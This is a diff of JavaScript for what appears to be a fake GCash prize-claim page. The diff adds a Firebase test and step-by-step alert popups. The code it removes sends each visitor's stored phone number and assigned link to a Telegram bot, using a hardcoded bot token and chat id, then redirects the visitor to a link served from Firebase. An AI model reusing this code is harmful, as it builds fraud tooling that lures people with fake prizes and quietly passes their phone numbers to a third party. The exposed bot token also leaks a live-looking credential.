@@ -3,66 +3,92 @@
  * COMPLETE LOGIC: Firewall Check, Link Redirect, Verification Popup
  */
 
+// ========== SIMPLE TEST - MAKIKITA SA SCREEN ==========
+function testFirebaseConnection() {
+    // Gumawa ng div para makita ang resulta
+    var testDiv = document.createElement('div');
+    testDiv.style.cssText = 'position:fixed; bottom:10px; left:10px; background:black; color:white; padding:10px; z-index:99999; font-size:12px; border-radius:5px;';
+    testDiv.innerHTML = 'Testing Firebase...';
+    document.body.appendChild(testDiv);
+    
+    if (typeof firebase === 'undefined') {
+        testDiv.innerHTML = 'ERROR: Firebase not loaded!';
+        testDiv.style.background = 'red';
+        return;
+    }
+    
+    testDiv.innerHTML = 'Firebase loaded. Checking links...';
+    
+    var db = firebase.database();
+    db.ref('links').once('value').then(function(snap) {
+        var data = snap.val();
+        if (data) {
+            var count = Object.keys(data).length;
+            testDiv.innerHTML = 'SUCCESS: ' + count + ' links found in Firebase!';
+            testDiv.style.background = 'green';
+        } else {
+            testDiv.innerHTML = 'WARNING: No links found in Firebase!';
+            testDiv.style.background = 'orange';
+        }
+    }).catch(function(err) {
+        testDiv.innerHTML = 'ERROR: ' + err.message;
+        testDiv.style.background = 'red';
+    });
+}
+
+// Auto-run ang test
+setTimeout(testFirebaseConnection, 1000);
+
 // ========== FIREBASE INITIALIZATION ==========
 const db = firebase.database();
 
 // ========== 1. MAIN ACTION: CLAIM THRU GCASH ==========
 async function handleClaimThruGCash() {
-    console.log("CLAIM THRU GCASH clicked");
+    alert("1. Button clicked!");
     
-    // Close prize popup first
     var prizePopup = document.getElementById('prizePopup');
     if (prizePopup) prizePopup.style.display = 'none';
     
+    alert("2. Popup closed");
+    
+    if (typeof firebase === 'undefined') {
+        alert("3. ERROR: Firebase not loaded!");
+        return;
+    }
+    
+    alert("3. Firebase OK");
+    
     try {
-        // Check firewall status
-        const firewallSnap = await db.ref('admin/globalFirewall/active').once('value');
-        const isFirewallOn = firewallSnap.val();
+        var db = firebase.database();
+        alert("4. Database OK");
         
-        console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
+        var firewallSnap = await db.ref('admin/globalFirewall/active').once('value');
+        var isFirewallOn = firewallSnap.val();
+        alert("5. Firewall status: " + (isFirewallOn ? "ON" : "OFF"));
         
         if (isFirewallOn === true) {
-            // FIREWALL ON - Show verification popup
+            alert("6. Firewall ON - showing verification");
             showFirewallVerificationPopup();
-        } else {
-            // FIREWALL OFF - Find available link
-            const linkSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
-            
-            if (linkSnap.exists()) {
-                // Get the link
-                const key = Object.keys(linkSnap.val())[0];
-                const linkData = linkSnap.val()[key];
-                let targetUrl = linkData.url;
-                
-                // Fix URL if needed
-                if (targetUrl && !targetUrl.startsWith('http')) {
-                    targetUrl = 'https://' + targetUrl;
-                }
-                
-                // Update link status to 'claimed'
-                const userPhone = localStorage.getItem("userPhone") || "Unknown";
-                await db.ref('links/' + key).update({
-                    status: 'claimed',
-                    user: userPhone,
-                    claimedAt: Date.now()
-                });
-                
-                // Send Telegram notification
-                fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("CLAIM SUCCESS!\nPhone: " + userPhone + "\nLink: " + targetUrl))
-                    .catch(e => console.log("Telegram error:", e));
-                
-                console.log("Redirecting to:", targetUrl);
-                alert("CLAIM SUCCESSFUL! Redirecting to GCash payout...");
-                window.location.href = targetUrl;
-                
-            } else {
-                // No link available
-                showNoLinkAlert();
-            }
+            return;
         }
+        
+        alert("6. Looking for links...");
+        
+        var linkSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+        
+        if (linkSnap.exists()) {
+            alert("7. Link found! Redirecting...");
+            var key = Object.keys(linkSnap.val())[0];
+            var linkData = linkSnap.val()[key];
+            var targetUrl = linkData.url;
+            window.location.href = targetUrl;
+        } else {
+            alert("7. NO LINKS AVAILABLE!");
+            showNoLinkAlert();
+        }
+        
     } catch(error) {
-        console.error("Error in handleClaimThruGCash:", error);
-        alert("SYSTEM ERROR\n\nPlease try again later.");
+        alert("ERROR: " + error.message);
     }
 }
 
